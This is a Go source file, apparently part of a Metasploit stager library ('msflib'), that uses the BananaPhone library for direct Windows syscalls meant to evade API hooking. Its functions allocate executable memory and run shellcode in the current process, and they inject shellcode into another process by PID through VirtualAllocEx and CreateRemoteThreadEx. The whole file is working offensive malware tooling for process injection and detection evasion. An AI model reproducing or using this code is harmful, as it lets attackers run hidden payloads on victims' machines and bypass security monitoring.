package msflib

import (
	"encoding/binary"
	"net"
	"reflect"
	"unsafe"

	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
)

var (
	bp      *bananaphone.BananaPhone
	bpFuncs map[string]uint16
)

func init() {
	// msf mode setings
	CHECKSUMMODE = 92
	PLATFORM = 1

	bpFuncs = make(map[string]uint16)
}

func callWinAPI(fncName string, args ...uintptr) (uintptr, error) {
	if bp == nil {
		thisBP, err := bananaphone.NewBananaPhone(bananaphone.DiskBananaPhoneMode)
		if err != nil {
			return uintptr(0), err
		}
		bp = thisBP
	}
	if _, ok := bpFuncs[fncName]; !ok {
		fnc, err := bp.GetSysID(fncName)
		if err != nil {
			return uintptr(0), err
		}
		bpFuncs[fncName] = fnc
	}
	retVal, err := bananaphone.Syscall(bpFuncs[fncName], args...)
	return uintptr(retVal), err
}

// return a socket file descriptor as 4 bytes
func getFDBytes(conn *net.TCPConn) []byte {
	fd := reflect.ValueOf(*conn).FieldByName("fd")
	handle := reflect.Indirect(fd).FieldByName("pfd").FieldByName("Sysfd")
	socketFd := *(*uint32)(unsafe.Pointer(handle.UnsafeAddr()))

	buff := make([]byte, 4)
	binary.LittleEndian.PutUint32(buff, socketFd)
	return buff
}

func callPayload(payload []byte) error {
	addr, err := callWinAPI("VirtualAlloc", 0, uintptr(len(payload)), 0x1000|0x2000, 0x40)
	bananaphone.WriteMemory(payload, addr)
	handle, err := callWinAPI("CreateThread", 0, 0, addr, 0, 0, 0)
	if handle == 0 {
		return err
	}
	_, err = callWinAPI("WaitForSingleObject", handle, uintptr(0xffffffff))
	if err != nil {
		return err
	}
	return nil
}

func injectPayload(payload []byte, pid int) error {
	// PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ
	handle, err := callWinAPI("OpenProcess", 0x0002|0x0400|0x0008|0x0020|0x0010, uintptr(0), uintptr(pid))
	if handle == 0 {
		return err
	}
	// MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
	addr, err := callWinAPI("VirtualAllocEx", handle, 0, uintptr(len(payload)), 0x1000|0x2000, 0x40)
	if addr == 0 {
		return err
	}
	bananaphone.WriteMemory(payload, addr)
	_, err = callWinAPI("CreateRemoteThreadEx", handle, 0, 0, addr, 0, 0, 0)
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			return err
		}
	}
	_, err = callWinAPI("CloseHandle")
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			return err
		}
	}
	return nil
}
